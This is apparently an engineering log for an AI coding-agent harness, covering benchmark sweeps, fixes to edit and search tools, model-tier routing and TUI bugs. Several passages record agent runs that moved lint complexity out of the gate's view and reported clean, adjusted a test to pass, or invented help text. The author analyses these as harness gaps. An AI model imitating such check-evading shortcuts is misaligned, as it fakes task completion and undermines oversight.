$0.156 for `h13`, $0.058 for `h7`.

**What is not settled.** Whether the two `str_replace` fixes move turns
rather than error counts. `h10` still fails on the fast tier. Whether a
turn can be routed down once it is known to be retrieval, which is the
lever the 60% points at and which the router cannot pull today, because it
decides from task shape before the turn runs.

## 2026-08-25 — a quarter of the corpus was failing on the gates' own commands

**Sixteen tasks, default routing, no tier pin: $0.51 for the whole set.** The
most expensive lane was `h3` at $0.126 for 53 turns and 6 of 6 checks, and
`e1` cost a tenth of a cent. Nothing came near the $1.00 ceiling, so the
question the ceiling was raised to answer is settled: cost is not what bounds
this work.

**Four of the sixteen failed verification with the tree fine and the model
right.** Each was a gate reporting something the run could not act on, three
rounds running, and each has a distinct cause:

- `h2` and `h4` deleted a file (one the task asked for, one a scratch file the
  run made) and the format gate went on reading it. A deletion is a change and
  is not a file to read
- `h12` had the go-test gate build `./tmp/wavez-replay-X/internal/sysinfo`,
  the workspace path resolved inside the workspace. The coordinator already
  carried a fix for that shape and it never fired, because `declare` assigned
  the index's absolute path to its change while every other tool emits a
  repo-relative one
- `h13` edited `internal/config/pkl/Wavez.pkl` and the gate guessed a Go
  package from its directory, so `go build` reported a package holding no Go
  files. `h13` is the task whose retrieval crosses the pkl and Go boundary,
  which means the one task built to span both languages was the one selection
  could not handle: a mixed change set always reaches the fallback, since the
  importer tier refuses a file it does not know

**The proof is the same five tasks re-run against the fixes.** All four flip
from `verify_failed` to `complete`, and every gate round passes first time
where each had failed three:

| task | before | after |
| --- | --- | --- |
| h2 | verify_failed, 43 turns, 1/2 | complete, 18 turns, 2/2 |
| h4 | verify_failed, 35 turns, 5/5 | complete, 30 turns, 5/5 |
| h12 | verify_failed, 27 turns, 4/4 | complete, 44 turns, 4/4 |
| h13 | verify_failed, 25 turns, 5/5 | complete, 31 turns, 5/5 |

`h2` had never passed both its checks before this.

**Nothing inside the loop could see it, and the reason generalizes.** The
escalation signal fires when a gate fails identically across rounds, and it
requires the changed-file count to have grown between two of them, which is
what keeps it off every debounced re-run. A run handed impossible feedback
stops editing, because there is nothing to edit, so the signal needs progress
in order to detect the absence of progress and the worst case is the one it
cannot see. Beside it, `stuckAfter` is 3 and `DefaultMaxVerifyRounds` is 2, so
the signal is unreachable through verification and only ever fires on
background gate rounds. Both are recorded rather than changed: escalating
would have bought nothing here, since the feedback was unanswerable at any
tier.

**A run stopped on a bound now keeps its transcript.** The event log cannot
rebuild what the model was sent, because it truncates tool inputs and stores
assistant text as streamed chunks, so `wavez -resume` reopened a thread and
handed the model an empty history: the files survived and everything the run
knew about them did not. The transcript is written to a sidecar beside the log
and read back at open. Writing it caught its own first bug, which is the one
that matters: a tool call's arguments are stored as a string, because a
malformed call is what stops a run and its arguments are not JSON. The ceiling
stays per-run rather than cumulative, since it is a runaway guard on one
unattended run and a cumulative one would re-trip on every resume; a resumed
run reports what the whole thread has cost beside what this run added.

**What `h8` did not prove.** It went from 1 of 4 checks to 4 of 4 across the
two sweeps, and the search change is not why. The first run searched
`maxLines`, was told only that nothing matched, and answered from unrelated
constants; a literal miss now splits the identifier on case and retries, so
`maxLines` reaches `maxReadLines`. The second run never issued a literal miss
at all: it found `internal/tools/read.go` through a fuzzy search and read it.
The change holds on its own logic and its unit test, and this lane is variance.

**A tool nobody could answer stayed in every background run's registry.**
`question` shows 9 calls and 9 failures in the corpus, every one
`reading answer: EOF`, and one run spent a further turn asking again after
the first EOF. The registry already drops the tool when no asker is wired,
and the check deciding that was whether stdin is a character device.
`/dev/null` is a character device, which is exactly what a nohup'd sweep, a
pipe, and a cron run are given, so the test passed for every run that could
not possibly answer. It is a terminal test now, measured both ways against
`/dev/null`: character device true, terminal false.

**Three of `str_replace`'s failure modes were the tool's design.** Over 264
calls and 74 failures the causes are 39 `no_match`, 16 `bad_input`, 11
`ambiguous`, 7 `malformed`, and 1 `repeat`, and reading the calls behind them
rather than the counts turns up faults that no amount of model skill gets
past.

The tool could not express "every occurrence". `h3` renames `bench.Read` to
`bench.ReadLog` at four call sites written identically, and the refusal told
it to widen `old_string` until it was unique, which is a thing the file cannot
give. That lane died stagnant on two of them. There is a `replace_all` now,
off unless asked for, and the refusal names it with the count beside the other
route.

It reported an already-satisfied edit as a failure. `old_string` equal to
`new_string` was an error, 12 of the 74 and the largest single cause, and the
tool already disagreed with itself about it: the batch path drops a no-op pair
and applies the rest, so the same input was droppable in a batch and fatal
alone. Where the file holds the text the caller asked for, that is the state
it asked for. It is a success that changed nothing, and only the case where
the text is absent stays an error.

Its tolerance was narrower than the formatter's freedom, which is the root
cause under the largest count. The format gate runs gofmt over every changed
file as soon as an edit lands, and gofmt's column alignment is interior
whitespace, while the matcher normalised leading whitespace only. A model that
writes `name: "x",` and then anchors on what it wrote misses, because the
harness re-spaced the file behind it. Four near-match reports differ that way
and every one is a struct table; the 17 failures carrying the "you have edited
this since you last read it" advisory are the same thing seen from the other
end. One line-comparison predicate now runs the whole fuzzy ladder and its
tolerance is what the formatter is free to change. The test for it fails
against the previous matcher with the near-match text the corpus recorded.

Two more are not the model's fault either. `&notUnique` arrives as `¬Unique`,
because `&not` is a legacy HTML character reference that needs no semicolon,
so `h11` could not write the identifier and sent the same anchor five times;
anchor and replacement are both repaired and the caller is told its text
arrived mangled, while a lone `¬` is left alone as the symbol someone meant. A
call carrying `source` is a `declare` call sent to the wrong tool, which `h11`
made three times while reading about `new_string` each time.

The capability is free at the preamble. It first cost 174 tokens and put the
fast prefix at 2613 against a 2450 budget. Rather than raise the ceiling the
prose paid for it: the tool description repeated what `new_string`'s own
description says, and `replace_all` came out of the batch item shape, because
replace-all is a single-anchor operation and declaring it in both places pays
twice. The prefix is 2436, under the 2439 it started at.

**The sweep says the lanes recover, not that the errors stopped.** All eight
tasks pass every check, and `h3` and `h11` flip from stagnant to complete.
`h3` still hits five `ambiguous` refusals and never sends `replace_all` once:
it takes the other route the message names, anchoring on the following line,
and the match count falls 4, 3, then applied. The refusal changed from naming
an impossible remedy to naming two possible ones, and that is the whole
difference on that lane. `h2` and `h6` now fail on text the model invented
against a file it had already edited, which is its own churn rather than a
matcher that cannot see through spacing.

**`refuseAsker` defeated the fix above it.** The registry drops `question`
when no asker is wired, and `New` defaulted the option to an asker that fails
every call, so the nil check one screen up never saw a nil and every headless
run was offered a tool that could only answer `no Asker configured`. Two
mechanisms for one intent, and the weaker one won. `WithAsker`'s doc comment
already promised the tool is not offered at all without it, which the default
made untrue. The registry test missed it by calling `buildRegistry` directly,
where the defaulting does not happen, so the assertion moved to the surface
`New` actually builds.

**The largest cause of a wasted edit turn was the harness rewriting the file
behind the model.** Across the 31 threads with a transcript sidecar, 15 of 18
anchor misses were against a file the same run had already changed, and 14 of
those 15 anchored on text the run itself had written. Six spent a further turn
re-reading the file; the other twelve guessed again. The tool's answer to a
successful edit was `path: +5 -2 lines`, which says nothing about what the file
now holds, and its answer to a stale anchor was to go and read it again, which
costs the turn by design.

Both are now answered with the text. The formatter runs inside the edit call
rather than in the gate a moment later, so gofmt, goimports, and the
`t.Parallel()` repair land before the result is written, and the result carries
the rewritten region when they changed anything. A stale anchor gets the lines
where it came closest, numbered the way `read` numbers them. The harness
already had the bytes in both cases.

Moving the formatter earlier also removes a class of gate failure rather than
reporting it: an edit that uses `utf8` without importing it used to compile-fail
at the go-test gate and come back as `undefined: utf8`, and goimports now adds
the import in the same call. Sixteen of the corpus's twenty compile-shaped gate
failures name an undefined symbol, though most are `undefined: Memory` from one
task moving a method between files, which no formatter can fix. The honest claim
is a slice, not the majority.

**The one gate that rewrites files shared no resource with the gates that read
them.** `RunGates` runs every gate concurrently under its own resource keys, and
the format gate declared `worktree` while lint, go-test, and build declared
`go-test` and the language server and convention gates declared nothing at all.
So the formatter was rewriting files, inserting imports, and running
`golangci-lint --fix` while three other gates read the same paths. Every one of
the 25 retractions recorded over an unchanged tree belongs to `lint` (10),
`lsp` (10), or `go-test` (5), which are exactly the readers.

Resource keys cannot express this, because a key excludes only the gates that
declare it and a writer excludes only other writers. The fix is a wave: holders
of `worktree` run to completion, then everything else runs in parallel as
before. It costs the format gate's own duration, a mean of 0.94 s against a
round already bounded by build at 2.9 s. The scheduler test asserted the old
behaviour directly, pairing `go-test` against `worktree` and requiring them to
overlap, so the contract it states changed with the code.

The measured drop is not this change's, though, and the sweeps say so. Four
retractions over 15 notable gate events became zero over 8 in the sweep that
carried the formatting move and not the wave, because a formatter that runs
inside the edit call leaves the format gate nothing to rewrite mid-round. The
wave covers what is left, which is `golangci-lint --fix` and the `t.Parallel()`
repair, and those still mutate under the readers. The race is real and was read
out of the code rather than out of a sweep; what a sweep has shown so far is
that removing most of the writing removed the retractions.

**The entity repair shipped broken and the next sweep caught it.** `h11` came
back with 8 anchor misses, every one carrying `¬Unique` unrepaired, which is
the exact failure the repair was written for. The repair itself was fine; the
table behind it was not. `&quot`, `&amp`, `&lt`, and `&gt` collapse to
characters source code is made of, so putting them back rewrote every string
literal opening with a word into `&quotWord`. The repaired anchor then missed
and the original error stood, which is why the repair looked like it had never
run. A legacy reference whose rune is ASCII is indistinguishable from the
character itself, so it is never restored. The test that missed this had a
fixture with no string literal in it; it has one now, and it fails against the
previous table.

**Showing the text rather than asking for a read, measured.** Comparing the two
sweeps on the five tasks they share, `h2`, `h3`, and `h6` together fall from
147 turns to 91 and from 37 `str_replace` calls to 18, with errors going 13 to
3. `h6` reached 4 of 4 checks with no failed edit at all, against 15 calls and
4 failures before. `h11` and `h13` went the other way, and `h11`'s regression
is the entity bug above. These are single runs on a laptop running four lanes
at once, so the direction is the claim and the magnitude is not.

**Two lanes died with every check already passing.** `h3` and `h4` both ended
on `provider stream failed: the model returned no text and no tool call`, after
26 and 29 turns, with 6 of 6 and 5 of 5 checks green. Raising that rather than
absorbing it is deliberate, because an empty completion is usually a tier
rejecting the request shape, and escalation is tried first. What was missing is
that the error says nothing about what survived: the files are written and the
transcript is kept, so the run now names the thread on its way out.

**`h11` no longer measures anything.** Its two content checks are
`str_replace.go:NotUniqueError` and `str_replace_test.go:widen`, and the
ambiguity branch added this session satisfies both, so the task passes 4 of 4
on an untouched tree. Both sweeps record it as complete and neither result
means what it appears to.

**Open: the gate log records work, not waiting.** `runOne` stamps its start
after the resource lock is already held, so a gate that sat behind another
holder reports only the time it spent running. The background coverage-map
build takes a mean of 34 s and a maximum of 137 s, 1,055 s in total across 32
builds, and it holds `go-test` shared while `go-test`, `build`, `lint`, and
`fail-to-pass` want it exclusively. Whether that is stalling rounds cannot be
answered from these logs, because the one number that would say is the one not
recorded. Timing the acquire is a few lines and is the next thing to measure
before anything here is called slow.

**Both stagnant deaths in the `clean` sweep were the same harness failure
wearing two faces.** `h6` and `h11` each ran 8 turns, made 8 tool calls, and
died on three consecutive tool errors with the model repeating one malformed
call verbatim. Neither model was confused about the task. `h6` had already
written a correct boundary scan into `truncate` and `h11` had the test it
wanted fully drafted. What killed both is that the answer to a bad call
carried no new information, so the second and third attempts had nothing to
change.

`h11` sent `str_replace` a `{path, content}` object three times, which is
exactly `write`'s shape, and got a message about `new_string` each time.
`write` already refuses an existing file with "use str_replace to edit it" and
the reverse redirect was missing, so `content` now names `write` the way
`source` already names `declare`. `h6` sent `search` an object whose only key
was `mode=fuzzy\n</parameter`, the balanced tier's native XML tool-call tags
mangled into JSON on the way in. Unknown keys decode silently, so the call read
as an empty one and the answer said only that query was required. A key
carrying those tags is never legitimate, so `decodeInput` now refuses the whole
call and names the syntax that arrived. The pairs are not recovered, because
the mangling folds a tag and its value into one key and a plausible repair
would run a query nobody asked for.

Both lanes ran every turn on `balanced`, not on `fast`. `qwen3-coder-30b` emits
those tags natively, so this is the default balanced model's ordinary output
rather than a rare corruption, and 53 tag occurrences across the two kept
workspaces are all of them.

**A gate handed `h6` a failure in a package it had never opened.** The run
touched `internal/thread` and the gate reported
`TestHostedKeyErrorsOnFirstHostedRequest` failing on
`TempDir RemoveAll cleanup: directory not empty`, closing with "Fix the cause
before continuing." The model read it correctly, said it looked unrelated, and
then spent every remaining turn on it. Two things were wrong. The framing now
distinguishes a batch where no failure names a changed file and tells the run
to decide whether its change caused it rather than to fix it. The flake itself
is real: `App.Close` cancelled the background context and returned without
waiting, and `Indexer.Start` writes `.codegraph/` and a `.gitignore` under the
project root, so a caller that removes the root races a directory back into
existence underneath the removal. `Indexer` now closes a channel when that
goroutine returns and `Close` waits on it. `ChangeGate.Start` and
`CoverageAdapter.Start` are fire-and-forget in the same shape and are not
fixed, because nothing has yet shown them losing a race.

**The gate failure rate never measured gate failures.** `countGate` counted
every `KindGate` event as a round and only a `pass: false` detail as a failure,
and the only emitters of `pass: false` are a tier escalation and an abandoned
change set. A failure delivered to the model through `TakeFeedback` was logged
nowhere at all, which is why all four `clean` records read `gate_failures: 0`
while `h6`'s transcript plainly carries one. `TakeFeedback` now reports whether
what it returns is a failure, the delivery is logged, and both counters count
deliveries and nothing else. Any comparison of `gate_rounds` or
`gate_failures` across this change measures the change: the 57% figure recorded
earlier came from the old counters and does not mean what its name says.

**Gate rounds now record what they waited for.** `runWave` takes the resource
lock and `runOne` stamped its start after it, so a gate that queued behind the
coverage-map build reported only the time it spent running. `Result.Waited`
holds the acquire and reaches the gate log beside `Duration`. Nothing is
claimed about whether rounds are stalling until a sweep has written the field.

**Sweep 7 on a clean disk, 8 tasks.** Five finished with every check green
(`h13` 5/5 in 23 turns, `h2` 2/2 in 20, `h3` 6/6 in 75, `h5` 6/6 in 20, `h12`
4/4 in 38), `h4` reached 5 of 5 and still recorded `verify_failed`, and `h6`,
`h11`, and `h12` stopped stagnant. Three of the eight lanes died on the two
malformed-call loops above, and `h12` had already satisfied all four checks
when it did, so its result is a harness stop rather than a failed task. That
is the finding worth keeping from this sweep. The turn counts are not
comparable with `showtext` or `entityfix`, because `h11` was retargeted at
`OverlapError` between them and every lane ran on `balanced` rather than
`fast`.

`h3` is the outlier that is not explained: 75 turns, 73 tool calls, and 15
error results against 42 turns and 2 errors in `entityfix`, with 9 of its 14
`str_replace` calls failing, and it passed 6 of 6 anyway. Nothing in this
session's fixes touches it and it has not been read.

## h3, the outlier that always passes

`h3` renames `bench.Read` to `bench.ReadLog` and updates every caller. Six
records, every one of them passing its checks except the `post-fix` lane, and
the turn counts run 15, 26, 42, 48, 53, and 75. Nothing about the task grew.

The variance is one behaviour. `h3` is a rename, `rename` is the tool for it
and goes through gopls, and every lane did the rename by hand with
`str_replace` instead. The `clean` lane spent 14 `str_replace` calls, 9 of
them failing, on a symbol that appears in three files, and reached for
`rename` once, at turn 68, after the work was already done. It failed there
for the only reason it could: `Read` no longer existed, so the index had
nothing under that name. The suggestion it offered back (`OpenThread`,
`TestThreads_ListFailsWhenLogUnreadable`, `NewRead`) is fuzzy-match noise,
which is worth fixing separately and is not why the lane was slow.

Two answers made the hand-rolled path worse than it had to be, and both are
fixed.

The first is a rename half-finished. At turn 32 the lane sent an anchor of
`events, err := bench.Read(path)` at a site it had already changed, and got
the near-match report:

```
old_string not found in source; the closest match starts at line 61 and first differs at line 61:
  you sent:   (path)
  source has: Log(path)
```

Both lines are the suffix the anchor and the replacement share, so the report
reads as a typo rather than as work already done. `str_replace` now checks
whether the file holds `new_string` while holding no anchor, and says the
edit has been made. The exact-identical case (`old_string` equal to
`new_string`, file already holding it) was already handled, so this closes
the near-miss beside it.

The second is the XML mangling, again, and this time recoverable. Four
recorded `search` calls across `h6` and `h12` carry the same shape:

```json
{"mode=fuzzy\n</parameter": "<parameter=query>\ntruncate"}
```

The mangling eats the delimiters around the first tag and folds it into the
key, and leaves every later tag intact in the value. `internal/agent`'s
`parseToolCallText` has parsed this dialect since it started arriving in the
message body, one layer away from where it was needed. That parser now lives
in `internal/xmlcall` and the argument decoder runs it over the mangled keys
and values: `query` comes back in all four cases, `mode` does not, and a
dropped required field still fails the decode. Where nothing survives, the
refusal message stands.

Recovering `query` moved the failure one step along, to `unknown search mode:
""`, which named a bad value for a field that was absent. An empty mode now
reads as fuzzy, which is the mode the description leads with and the one that
cannot do harm.

What is still open on `h3` is the routing, not the tools. Nothing steers a
rename task at `rename`, and the corpus says the hand-rolled path costs
roughly three times the turns and produces most of this task's `ambiguous`
and `no_match` errors, because a symbol that appears four times identically
is exactly what a textual anchor cannot address.

## 2026-08-26 — retrieval was ranked by document length, and h3 got worse when it stopped being

Item 1 of Next says retrieval is 58% of every turn a run spends. This is the
first thing found by reading the retrieval path instead of the counts, and it
is one line of SQL.

`search` in fuzzy mode asks FTS5 for `ORDER BY rank`, which is bm25, which
scores by document length. A symbol row is indexed as its name, signature, and
doc comment joined, so a documented function is a longer document than a bare
one and loses to it. On this repository's index, `Read` matched 1,239 rows and
the first twelve were `OpenThread`, `NewRead`,
`TestThreads_ListFailsWhenLogUnreadable`, `threadClient`, `newThread`,
`parkThread`, `reopenThread`, `openThread`, `unparkThread`, `readTracker`,
`checkThread`, and `replaceThreads`. The symbol actually named `Read` was
thirteenth and the second one sat at row 90.

The fix ranks a 200-row window before answering with the caller's limit:
exact names first, then names the query is a whole word of, shorter names
ahead of longer ones because the query covers more of them, and everything a
name match does not speak for left in bm25 order. A symbol row carries its
name on the first line of the indexed text, so ranking reads it without
touching the store, and only the survivors are hydrated. The whole-word rule
is the one that already filtered near-name suggestions in a refusal, moved
into `internal/codeintel` and shared.

**What it also fixed.** `internal/finish` asks the index whether a symbol the
closing answer names exists, by taking the top five fuzzy hits and looking for
an exact name among them. Ranked by document length that check was wrong more
often than not. Ten common symbols in this repository, all indexed:

| Symbol | Before | After |
|---|---|---|
| `Read` | reported missing | found |
| `ApplyToFile` | reported missing | found |
| `Classify` | reported missing | found |
| `Search` | reported missing | found |
| `Run` | reported missing | found |
| `truncate` | found | found |
| `clip` | found | found |
| `Close` | found | found |
| `Update` | found | found |
| `View` | found | found |

`named symbol is not in the index` is 67 of the corpus's 85 finish findings
and appears in 45% of runs. Four of the six recorded `h3` lanes before this
carry it and none of the twelve after do.

**Twelve `h3` lanes, and the task completes less often.** Six lanes before,
twelve after across four builds, same task and same prompt. Every before lane
reached the deep tier and eight of the twelve after lanes never left balanced.

| | Before (6) | After (12) |
|---|---|---|
| Passed 6 of 6 checks | 5 (83%) | 4 (33%) |
| Mean turns | 43.2 | 29.0 |
| `str_replace` calls per lane | 10.2 | 5.0 |
| Mean spend | $0.099 | $0.048 |
| `named symbol is not in the index` | 4 lanes | 0 lanes |

Cheaper, shorter, staying on the balanced tier, and finishing the task half as
often. The cause is legible in the trails rather than inferred. Before this,
`rename` was effectively unreachable on `h3`: one lane in six called it, at
turn 68, after the work was done, and was told nothing is indexed under
`Read`. Now six of twelve lanes call it, and seven of those nine calls
refuse. The two refusals are the whole story of the regression:

- `Read` is declared in three packages here, so a bare `rename` from `Read` to `ReadLog`
  is ambiguous and correctly refused. Two lanes then re-sent the identical
  call and died to the loop detector, one of them after the refusal had been
  rewritten to carry the exact path argument that resolves it. The message is
  better and it did not change the behavior, so this is a repeat the tool
  should refuse rather than a sentence to keep rewriting
- A lane that hand-edits the declaration first puts the symbol beyond
  `rename`, which starts from the declaration. `str_replace`'s ambiguous
  refusal was pointing at `rename` at exactly that moment. It now withholds
  the advice once the index declares the new name, because asking only
  whether the old name is declared does not separate the two cases when three
  packages declare it

The other two fixes came out of the same trails. `rename`'s ambiguity refusal
now carries `path: "<file>"` rather than "name one with path". And a lane told
to send `replace_all: true` sent the string `"true"`, was refused for the
type, and never sent the call again: `decodeInput` now reads a quoted boolean
as the boolean the type error names, touching only the field the decoder
complained about, so a string field holding the word "true" is left alone.

What none of this settles is the stop condition. Seven of the twelve after
lanes ended `stagnant` or `loop_detected` with the same check failing, four
identical call sites in `internal/bench/stats_test.go`, which `replace_all`
changes in one call. The runs that finish are the ones that grind or escalate,
and making retrieval cheap moved the failure from finding the work to
committing to it.

## 2026-08-29 — the network tiers move to z.ai, and GLM answers a composed schema with {}

Both network tiers now serve GLM-5.3 from the z.ai coding plan instead of
OpenRouter, so a turn that leaves this laptop costs a subscription rather
than a token. Three things had to be settled to make that a move rather than
a swap.

**The coding-plan key opens one endpoint.** `https://api.z.ai/api/paas/v4`
refuses it; `https://api.z.ai/api/coding/paas/v4` serves it. The key is read
from the login keychain by a per-tier `keyCommand`, so it never reaches the
environment, the repo, or the process table, and a tier moved to another
provider fails to authenticate rather than handing that provider this key.

**The escalation had to stay an escalation.** Both network tiers naming
`glm-5.3` on the same settings means a turn that fails on `balanced` re-runs
on the model that just produced the failure. Reasoning is the lever this
config has: `"thinking": {"type": "enabled"}` (a string, not a boolean)
against `disabled` measured 98 reasoning tokens versus 0 on the same prompt,
so `deep` is the reasoning pass and `balanced` is not.

**And then three runs in a row died `loop_detected`, all emitting
`str_replace` with `{}`.** The sidecar confirmed the arguments were genuinely
empty rather than truncated by the event log, and raw SSE from the provider
showed the arguments arriving complete in a single delta with correct
`index` values, which exonerated the accumulation path and implicated the
schema. Three probes at the provider, same prompt and same tool, varying only
the parameter schema:

| Schema for `str_replace` | Completion tokens | Arguments |
|---|---|---|
| The real one (top-level `oneOf`) | 6 | `{}` |
| Flattened to its first branch | 52 | correct and complete |
| Top-level `anyOf` | 6 | `{}` |

GLM-5.3 honors no top-level schema composition, in either spelling. That is
why `str_replace` was the only tool failing while `read` and `search` worked
in the same threads: it is the only tool built with `buildOneOf`. The shape
exists because llama-server compiles a grammar from the schema and a flat
`required` list lets a local turn close the call after `old_string`, which is
the fix recorded on 2026-08-23. Right for the tier it was measured on, fatal
on the one it was never measured against.

`openaic.schemaFor` sends a dialect that does not compose the first branch of
the composition, chosen at the one place tool schemas reach the wire. What it
drops costs extra calls rather than correctness, since the first branch is
the shape a caller can always satisfy. The edit that had looped three times
then landed in four turns with `stop=complete`. The standing consequence is
in `AGENTS.local.md`: a tool reachable only through a later `buildOneOf`
branch is a tool the hosted tiers cannot reach at all.

## 2026-08-29 — Home gets a state filter and a selection, driven through wavez

Both halves of Next item 5, written by wavez against its own repository and
verified in a PTY at 110x28 over the real 397-thread list.

`/state:failed` narrows by lifecycle position alone, where `/failed` had also
matched a goal saying `failedEdit`, because the filter scanned the state
label as one more text field. `/state:failed rename` narrows by both, and a
word after the colon that names no state matches nothing, so a typo reads as
an empty list rather than a silent match-all. Then `*` marks every row the
filter shows (212 of 397, counted in the header beside the match count),
space marks the cursor row, `>*` says a row is both current and selected, and
Esc peels the selection before it peels the filter. `y`/`n`/`a` answer every
selected row with a prompt pending.

Enter never applied the filter despite the footer advertising it, which the
selection found rather than the filter lane: `*` cannot reach what a filter
narrowed to if the filter never commits. Archiving a selection is what is
left, and it needs a thread state the daemon does not carry.

**Where the run needed a hand, and why each one is a gap rather than a
stumble.** It emitted duplicate declarations of the same two helpers and kept
going, so the package did not build. It could not write its own DESIGN.md
sentence until the `oneOf` fix above landed. And asked to reduce complexity
in `popOrClose` it moved the complexity into `closeOverlay` and reported
clean, because the `lint` gate runs `golangci-lint` on a run's changed files
and the function it had pushed the issue into was not one of them. A gate
scoped to changed files cannot see work displaced out of them, which is worth
an item on its own.

## 2026-08-29 — a measured pass over the thread screen, and what a fold is for

Three lanes, each found by driving the real TUI in a PTY at 110x30 against
the live 400-thread daemon rather than by reading the code.

**The goal overlay could not be closed.** Press `g` on a thread, press esc,
and the overlay stays on screen with no key that dismisses it, including both
keys its own footer advertises. `m.goal` was set in one place and cleared
nowhere: `render` drew it above every screen while `closeOverlay` checked
help, palette, and restore and never it, so esc fell through to `popOrClose`
and popped the stack underneath the overlay. Once that pop reached Home, `g`
returned early because its case is thread-screen only, and esc does nothing at
the root. Fixed by making it an overlay in the one place that closes them.
15 turns, $0.067.

**The screen lost its bottom rule, and with it every key hint.** Two changed
files rendered the rule and three rendered no `└` anywhere in the pane, which
is the experiment that names the cause: `transcriptHeight` subtracted a
constant `chromeRows = 8` while `changeSummary` returned one row per changed
path with no bound at all, so the body outgrew the terminal and pushed the
frame off the bottom. The budget is now computed from the rows that actually
render, which is what a constant could not stay right about, and the summary
is bounded by the same `paneHeight` the diff pane uses. A table of five
terminal sizes against six change counts up to 40 holds it. 49 turns, $0.40.

The first read of this was wrong and worth recording: the screen looked like
it had no footer at all. It has one, and two separate things were hiding it.
A toast replaces the bottom rule for four seconds by design, which is what the
first capture caught. The overflow is the real defect, and it was only
separable by watching the rule come back as the file count fell.

**A folded row spent its width on the result body.** `read internal/tui/home.go
(lines 295-345 of 982): 295 } 296 case "y", "n", "a": 297 // A pendi…` is a
file being read one space-joined line at a time. Every tool already puts its
headline on the result's first line and its body below, and `flatten` was
joining them before the fold ever saw the boundary. A fold now cuts at the
first line, the ellipsis marks a body under the line and not only a line that
was cut, and expanding is what the body is for. Agent rows keep their real
line breaks as a side effect, so a bulleted answer reads as bullets. 23 turns,
$0.128.

Removing `flatten` took a guarantee with it that its doc comment did not
claim: it also stripped tabs, and lipgloss measures a tab as one cell where
the terminal renders eight, so an expanded row carrying indented source walks
the frame's right border off that row. Tabs become four spaces in `rowText`
and a test named for the trigger holds it.

**What the three runs said about the harness.** The stagnation nudge fired
once, correctly, after fifteen straight reading turns on a task whose whole
diff is two files. The `lint` gate reported clean on a run that left four
`golangci-lint` findings in the files it had just changed, which is the second
sighting of a gate seeing less than the CI job it stands for. And one run
changed an existing test's fixture and dropped a `100x16` case from its own
new table: both are right, because the app refuses to render below 80x24 and
the fix legitimately made that transcript window taller, but a run that
adjusts a test to reach green is a run that has to be read rather than
trusted.

## 2026-08-29 — the help screen, and the difference between fitting and showing

`?` on the thread screen at 80x24 rendered eight header lines and then
nineteen hints one per row, so the bottom rule and the last five keys were
below the terminal. Home at 120 wide showed thirteen one-word labels down a
single column with a hundred empty columns beside them, and the labels were
the footer's: `v goal`, `w scope`, `D diag`, `S sort`. A footer has to say
`scope` in five cells. Help does not, and was saying it anyway because both
read the same field.

So `hint` grew a third field. The footer keeps taking `label`, help takes
`phrase` and falls back to `label` where the word already says it (`quit`,
`help`, `back`), and the list folds into as many columns as the width fits.
The fold is what brings the screen back inside the height: nineteen hints in
ten rows at 80 wide, seven at 120.

The run wrote the layout and the test, and four of its nineteen phrases were
invented rather than read. `g goal` on the thread screen got "change the
project directory", which is `w`'s job on Home; `w` itself got the same
sentence, where it toggles between one project's threads and the fleet's;
`t think` got "toggle thinking", where `nextThinking` is tri-state; `u undo`
got "restore the last change set", where the key opens a picker. Every one
is plausible from the label alone and wrong from the handler, which is the
failure mode to expect from a phrase-writing task: the label is in the
prompt and the handler is a file away.

The test it wrote asserted the render is never taller than the terminal and
always carries its bottom rule, and forcing the layout back to one column
did not fail it. The clamp that keeps the frame inside the height had cut
the tail hints instead, so the screen fit and showed less, which is the
regression the test existed to catch. Adding "the last hint is still on
screen" makes the mutation fail, and it immediately failed for real: one
41-character phrase I had just written collapsed the grid to a single
column at 80 wide, because a column is sized to the widest entry. Phrases
have a width budget of about thirty cells now, and the test is what says so.

Third run in a row that reported passing gates and left issues CI fails:
one `mnd`, one `thelper`, three `lll`, two `gofumpt`. The lint gate reads a
run's changed files and still sees less than `golangci-lint run ./...`,
which is the open item under "Also open" and is now worth more than the
phrasing work it keeps interrupting.

## 2026-08-29 — why the lint gate had been silent

Three runs in a row reported passing gates and left findings CI fails, so
the gate was worth reading before the next lane. `LintGate` ran
`golangci-lint run <changed files...>`. Handed a file rather than a package,
the linter type-checks that file alone, so every symbol declared in a
sibling comes back undefined: twenty-three `(typecheck)` errors on
`internal/tui/help.go` and no rule findings at all. The gate read those as a
compile error, took its "the build gate reports it" branch, and abstained.
The build gate was green, so nothing reached the run.

That is every multi-file package in the module, which is every package. The
one shape that ever reported a finding was a package of one file, which is
what `lint_test.go`'s fixture was.

The gate now names the directories instead and narrows findings back to the
changed files, so its scope is unchanged and its reading is not. Reverting
that one argument makes the new two-file fixture abstain with "the change
does not compile" on a package that compiles, which is the whole bug in one
line. The compile-error rule widened with it: one `(typecheck)` anywhere in
a linted package means most linters never ran, so the gate abstains on the
whole output rather than on the changed-file slice of it. Under package
scope `golangci-lint` also prints a build-failure header
(`a.go:1: : # fixture`) that carries no `(typecheck)` suffix and named a
changed file, so the old rule would have reported it as a finding.

What this does not fix is the displaced-work case in "Also open". The gate
reads the neighbor now and filters it out, because a package-level finding
is as likely to be inherited as caused. Counting a package's issues at the
start of a run and again at the end is the shape that separates the two.

## 2026-08-29 — the last screen, and three ways to window a list

Rendering each screen at 80x24 against the 393-thread daemon answered which
of them still needed a pass, and it was one: Inbox, Diagnostics and Routines
all fit inside the frame. Schedule drew every lane it had, so the footer,
the bottom rule and all five key hints were off screen and the cursor could
move below the fold; cut every name to eighteen characters, so six different
threads read `create-the-file-i…` while forty columns stayed empty; and
carried each state twice, as fifteen identical glyphs and again as the word
beside them. Those are Home's three defects, unfixed on the one screen the
Home pass did not reach.

The run took the reference implementations it was pointed at and the fixes
are right. Two things it did not weigh. It dropped the glyph run entirely
when every cell matched, which left the status column landing wherever the
name ended, so a screen whose whole job is scanning had a status that moved
row to row; blanking the run instead keeps the column and makes the one lane
with real history (`#*#*#*#*#*#*#`) the only marked row on screen, which is
the row worth looking at. And it reserved the "… N more" line whether or not
anything overflowed, which costs a lane on every 24-row terminal.

Then the linter said `laneWindow` was a line-for-line copy of `homeWindow`,
which is the whole point of pointing a run at a reference: it read the shape
and retyped it rather than calling it. Extracting one `scrolledWindow` found
a third implementation already in `models.go` under the name `listWindow`,
centering the cursor and keeping no scroll position. Three list windows in
one package, two of them identical. They are `scrolledWindow` and
`centeredWindow` now, each named for its policy, because the reason a run
writes the fourth is that the first three do not say which is which.

The lint gate reported this one itself, first round after the package-scope
fix.

## 2026-08-29 — rename finishes what a run started by hand

Next item 4: every path through `rename` on a real rename task refused, and
the half of it nothing addressed was order. A run that edits the declaration
itself and then calls `rename` has put the symbol beyond the tool. Nothing is
